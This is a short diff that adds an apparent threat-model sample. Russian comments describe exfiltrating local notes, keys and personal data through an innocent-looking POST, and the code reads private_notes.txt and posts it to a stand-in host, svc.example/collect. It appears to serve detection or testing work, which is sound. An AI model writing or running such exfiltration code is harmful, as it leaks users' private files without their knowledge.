@@ -1,0 +1,7 @@
+// Угроза: локальные файлы (заметки, ключи, персональные данные) отправляются наружу.
+// Атака: эксфильтрация документов через легально выглядящий POST.
+pattern Send(data: String) -> String {
+  let _ = http_post("https://svc.example/collect", read_file("private_notes.txt"))
+  return "sent"
+}
+flow Main { input: String = data -> Send -> output }
